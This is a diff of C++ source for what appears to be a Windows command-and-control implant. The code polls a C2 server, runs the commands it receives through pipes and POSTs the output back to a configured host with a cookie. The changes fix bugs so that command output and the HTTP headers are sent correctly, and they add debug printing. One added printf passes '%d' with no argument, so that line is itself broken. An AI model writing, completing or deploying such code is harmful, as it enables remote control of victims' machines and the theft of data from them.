@@ -21,7 +21,7 @@ int main()
 
 int execute_command(
     std::string command,
-    std::vector<char> command_output)
+    std::vector<char> &command_output)
 {
     HANDLE hPipeRead, hPipeWrite;
 
@@ -88,10 +88,13 @@ int execute_command(
             if (!dwAvail) // No data available, return
                 break;
 
+            int bytes_to_read = std::min((int)sizeof(buf) - 1, (int)dwAvail);
+            printf("[+] Reading %d from the named pipe\n");
+
             if (!::ReadFile(
                     hPipeRead,
                     buf,
-                    std::min((int)sizeof(buf) - 1, (int)dwAvail),
+                    bytes_to_read,
                     &dwRead,
                     NULL) ||
                 !dwRead)
@@ -101,7 +104,7 @@ int execute_command(
             }
 
             buf[dwRead] = 0;
-            command_output.insert(command_output.end(), buf, buf + sizeof(buf));
+            command_output.insert(command_output.end(), buf, buf + bytes_to_read);
         }
     }
 
@@ -148,7 +151,6 @@ int poll_c2()
         std::cout << i;
     }
     std::cout << std::endl;
-    
 #endif
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
@@ -321,7 +323,7 @@ int parse_http_response_body(std::vector<char> http_response, int http_body_inde
         }
 
         std::vector<char> pwd_output;
-        pwd_output.insert(pwd_output.begin(), current_path, current_path + sizeof(current_path));
+        pwd_output.insert(pwd_output.begin(), current_path, current_path + strlen(current_path));
 
         send_command_output(pwd_output);
     }
@@ -383,10 +385,19 @@ int send_command_output(std::vector<char> command_output)
     std::string http_request_headers = "POST " HTTP_POST_PAGE " HTTP/" HTTP_PROTO_VER "\r\n";
     http_request_headers += "Host: " HTTP_HOST "\r\n";
     http_request_headers += "Cookie: " HTTP_COOKIE_NAME "=" HTTP_COOKIE_VALUE "\r\n";
-    http_request_headers += "Content-Length: " + command_output.size();
+    http_request_headers += "Content-Length: " + std::to_string(command_output.size());
     http_request_headers += "\r\n";
     http_request_headers += "Connection: close\r\n";
     http_request_headers += "\r\n";
+
+#ifdef _DEBUG
+        printf("[+] Request headers:\n");
+        for (char i: http_request_headers)
+        {
+            std::cout << i;
+        }
+        std::cout << std::endl;
+#endif  
 
     std::vector<char> http_request;
     http_request.insert(http_request.begin(), http_request_headers.begin(), http_request_headers.end());
